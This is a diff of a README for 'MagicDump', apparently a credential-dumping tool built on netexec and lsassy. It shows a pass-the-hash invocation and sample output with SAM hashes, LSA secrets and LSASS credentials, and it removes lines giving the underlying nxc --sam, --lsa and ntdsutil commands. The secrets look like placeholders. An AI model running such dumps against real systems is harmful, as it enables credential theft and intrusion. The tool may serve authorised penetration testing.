@@ -84,7 +84,7 @@ Run the script with the required options:
 ```
 
 ```bash
-./MagicDump -t 192.168.1.100 -u administrator -H 'a066fbf49e79f43fffc449810227e399'
+./MagicDump -t 192.168.1.100 -u administrator -H '0123456789abcdef0123456789abcdef'
 ```
 
 <br>
@@ -95,23 +95,30 @@ Output:
        MagicDump v1.0       
 ==============================
 [INFO] Starting MagicDump against target 192.168.1.100
-[INFO] Authenticating as user 'Administrator'...
+[INFO] Authenticating as user 'administrator'...
 [INFO] Starting SAM dump using netexec...
-[DEBUG] Running command: nxc smb 192.168.1.100 -u Administrator -p 'SuperSecretPass' --sam > '/home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt' 2>/dev/null
-[DEBUG] SAM dump completed successfully. Output saved to /home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt
 [LOG] Operation: SAM, Status: success
-[INFO] SAM dump saved to /home/user/.magicdump/dumps/SAM_dump_192.168.1.100.txt
+[INFO] SAM dump saved to ~/.magicdump/dumps/192.168.1.100/SAM_dump_192.168.1.100.txt
+[SAM HASHES FOUND]:
+SMB                      192.168.1.100    445    HOST               administrator:500:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef:::
+SMB                      192.168.1.100    445    HOST               Guest:501:aad3b435b51404eeaad3b435b51404ee:abcdefabcdefabcdefabcdefabcdef:::
+SMB                      192.168.1.100    445    HOST               DefaultUser:503:aad3b435b51404eeaad3b435b51404ee:deadbeefdeadbeefdeadbeefdeadbeef:::
 [INFO] Starting LSA dump using netexec...
-[DEBUG] Running command: nxc smb 192.168.1.100 -u Administrator -p 'SuperSecretPass' --lsa > '/home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt' 2>/dev/null
-[DEBUG] LSA dump completed successfully. Output saved to /home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt
 [LOG] Operation: LSA, Status: success
-[INFO] LSA dump saved to /home/user/.magicdump/dumps/LSA_dump_192.168.1.100.txt
-[INFO] Starting NTDS dump using ntdsutil...
-[DEBUG] Running command: nxc smb 192.168.1.100 -u Administrator -p 'SuperSecretPass' -M ntdsutil > '/home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt' 2>/dev/null
-[DEBUG] NTDS dump completed successfully. Output saved to /home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt
-[LOG] Operation: NTDS, Status: success
-[INFO] NTDS dump saved to /home/user/.magicdump/dumps/NTDS_dump_192.168.1.100.txt
-[INFO] Dumping complete. Logs saved to /home/user/.magicdump/logs/report_192.168.1.100_20250104140000.json.
+[INFO] LSA dump saved to ~/.magicdump/dumps/192.168.1.100/LSA_192.168.1.100.txt
+[LSA SECRETS FOUND]:
+SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:aes256-cts-hmac-sha1-96:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:aes128-cts-hmac-sha1-96:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:des-cbc-md5:cccccccccccccccc
+SMB                      192.168.1.100    445    HOST               EXAMPLE\HOST$:plain_password_hex:d41d8cd98f00b204e9800998ecf8427e
+SMB                      192.168.1.100    445    HOST               NL$KM:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+SMB                      192.168.1.100    445    HOST               EXAMPLE\service_user:ServicePass123
+[INFO] Starting LSASS dump using lsassy...
+[LOG] Operation: LSASS, Status: success
+[INFO] LSASS dump saved to ~/.magicdump/dumps/192.168.1.100/LSASS_dump_192.168.1.100.txt
+[LSASS CREDENTIALS FOUND]:
+EXAMPLE\service_user abcdefabcdefabcdefabcdefabcdefabcdef
+[INFO] Dumping complete. Logs saved to ~/.magicdump/logs/192.168.1.100/report_192.168.1.100_20250105080107.json.
 ```
 
 <br>
